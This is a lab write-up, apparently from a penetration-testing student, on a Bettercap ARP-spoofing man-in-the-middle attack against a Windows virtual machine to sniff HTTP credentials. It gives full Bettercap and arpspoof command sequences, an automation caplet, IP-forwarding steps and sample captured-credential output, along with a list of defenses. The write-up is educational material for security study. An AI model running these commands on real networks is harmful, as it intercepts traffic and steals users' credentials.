# Man-in-the-Middle Attack Using Bettercap

## Disclaimer
This writeup is for **educational purposes only**. Perform these techniques only in authorized lab environments or on networks you own. Unauthorized access to computer networks is illegal.

---

## Lab Environment

- **Attacker Machine**: Kali Linux (IP: 172.16.236.X)
- **Target Machine**: Windows (IP: 172.16.236.145)
- **Gateway**: 172.16.236.2
- **Tool**: Bettercap
- **Network**: VMware/VirtualBox virtual network

---

## Objective

Perform a Man-in-the-Middle (MITM) attack to intercept network traffic between a Windows machine and the gateway, capturing credentials transmitted over unencrypted HTTP connections.

---

## Attack Overview

The attack consists of three phases:

1. **ARP Spoofing**: Poison the ARP cache of both the target and gateway
2. **Traffic Interception**: Position ourselves as the MITM
3. **Credential Sniffing**: Capture credentials from HTTP traffic

---

## Step-by-Step Attack Process

### Phase 1: Initial Setup

First, verify connectivity to both the target and gateway:

```bash
# Verify network connectivity
ping -c 3 172.16.236.145  # Target Windows machine
ping -c 3 172.16.236.2    # Gateway

# Check current ARP cache
arp -a
```

### Phase 2: Manual ARP Spoofing (Testing)

Before automating, I tested the attack manually using Bettercap:

```bash
# Launch Bettercap
sudo bettercap -iface eth0

# Inside Bettercap interactive shell:
net.probe on                              # Discover hosts on network
set arp.spoof.fullduplex true            # Enable bidirectional spoofing
set arp.spoof.targets 172.16.236.145     # Set Windows machine as target
arp.spoof on                              # Start ARP spoofing
net.sniff on                              # Begin packet sniffing
```

**What's happening:**
- `net.probe on` - Discovers active hosts on the network
- `arp.spoof.fullduplex true` - Spoofs ARP packets to both target AND gateway (bidirectional)
- `arp.spoof.targets` - Specifies the victim machine
- `arp.spoof on` - Starts sending poisoned ARP replies
- `net.sniff on` - Captures and parses network traffic for credentials

### Phase 3: Verification

On the Windows target machine, I verified the attack was successful:

```cmd
arp -a
```

**Expected result**: The MAC address for the gateway (172.16.236.2) should now show the attacker's MAC address instead of the actual gateway MAC.

### Phase 4: Automation with Caplets

After successfully testing the attack manually, I got lazy (and smart!) and decided to automate the entire process using a Bettercap caplet.

**Creating the caplet:**

I created a file called `spoof.cap` with all the commands:

```bash
# Create the caplet file
nano spoof.cap
```

**File contents: `spoof.cap`**
```
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 172.16.236.145
arp.spoof on
net.sniff on
```

Save the file (Ctrl+O, Enter, Ctrl+X in nano).

**Why caplets are awesome:**
- ✅ No need to type commands every session
- ✅ Consistent attack execution
- ✅ Easy to modify targets or settings
- ✅ Shareable and reusable
- ✅ Perfect for penetration testing workflows

**Running the caplet:**

Now, instead of launching Bettercap interactively and typing five commands, I can execute the entire attack with a single command:

```bash
sudo bettercap -iface eth0 -caplet spoof.cap
```

**That's it!** This one-liner now:
1. Discovers the network
2. Starts bidirectional ARP spoofing
3. Begins credential sniffing

For subsequent sessions, I simply run the same command - no repetitive typing needed.

---

## Captured Credentials

Once the MITM attack is active and `net.sniff on` is running, Bettercap automatically parses HTTP traffic and displays captured credentials:

```
[hh:mm:ss] [sys.log] [inf] [172.16.236.145] username:password @ http://example.com/login
```

Example output:
- **Source IP**: 172.16.236.145 (Windows target)
- **Credentials**: username and password
- **URL**: The website where credentials were submitted

---

## Important Limitations

### ⚠️ HTTP vs HTTPS

This attack **only works against HTTP traffic** (unencrypted). Here's why:

| Protocol | Vulnerable? | Reason |
|----------|-------------|---------|
| **HTTP** | ✅ Yes | Credentials sent in plaintext |
| **HTTPS** | ❌ No | Encrypted with TLS/SSL |

**HTTPS Protection:**
- Modern browsers warn users about HTTPS certificate errors
- Even in MITM position, we cannot decrypt HTTPS without additional attacks (SSL stripping, certificate cloning, etc.)
- Most major websites (Google, Facebook, banks) use HTTPS exclusively

---

## Troubleshooting

### Issue: "Could not find mac for 172.16.236.2"

**Cause**: Bettercap couldn't discover the gateway's MAC address.

**Solutions**:
```bash
# Clear ARP cache
sudo ip neigh flush all

# Manually populate ARP cache
ping -c 3 172.16.236.2

# Verify gateway is reachable
ip route show
```

### Issue: ARP cache not poisoned on Windows

**Possible causes**:
1. Windows has static ARP entries
2. Network interface in VM not set to promiscuous mode
3. IP forwarding not enabled on Kali

**Verify IP forwarding**:
```bash
# Check current setting
cat /proc/sys/net/ipv4/ip_forward

# Should return 1. If not, enable it:
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

## Comparison: Bettercap vs Arpspoof

I initially tested with `arpspoof` before switching to Bettercap:

**Arpspoof method** (requires two terminals):
```bash
# Terminal 1 - Spoof target
sudo arpspoof -i eth0 -t 172.16.236.145 172.16.236.2

# Terminal 2 - Spoof gateway
sudo arpspoof -i eth0 -t 172.16.236.2 172.16.236.145
```

**Bettercap advantages**:
- ✅ Single command with `fullduplex` option
- ✅ Built-in packet sniffing and credential parsing
- ✅ Automation via caplets
- ✅ Better visualization and logging
- ✅ More features (DNS spoofing, SSL stripping, etc.)

---

## Defense Mechanisms

Organizations can protect against this attack:

1. **Use HTTPS everywhere** - Encrypts all traffic
2. **Static ARP entries** - Prevents ARP poisoning
3. **Dynamic ARP Inspection (DAI)** - Switch-level protection
4. **Network segmentation** - Limits attack surface
5. **Encrypted VPN** - Protects traffic even on compromised networks
6. **ARP monitoring tools** - Detect ARP spoofing attempts (XArp, ArpWatch)

---

## Conclusion

This attack demonstrates why unencrypted HTTP is dangerous on shared networks. The combination of ARP spoofing and packet sniffing allows attackers to capture credentials in plaintext. Modern security practices (HTTPS everywhere, certificate pinning, VPNs) have made this attack less effective, but it remains a threat on networks with legacy systems or improperly configured applications.

**Key Takeaways**:
- ARP spoofing is trivial on unsecured networks
- HTTP credentials are transmitted in plaintext
- HTTPS provides crucial protection against MITM attacks
- Automation with caplets makes attacks reproducible and efficient

---

## References

- [Bettercap Official Documentation](https://www.bettercap.org/)
- [Bettercap Caplets Guide](https://www.bettercap.org/usage/#caplets)
- ARP Spoofing (RFC 826)
- OWASP: Man-in-the-Middle Attacks
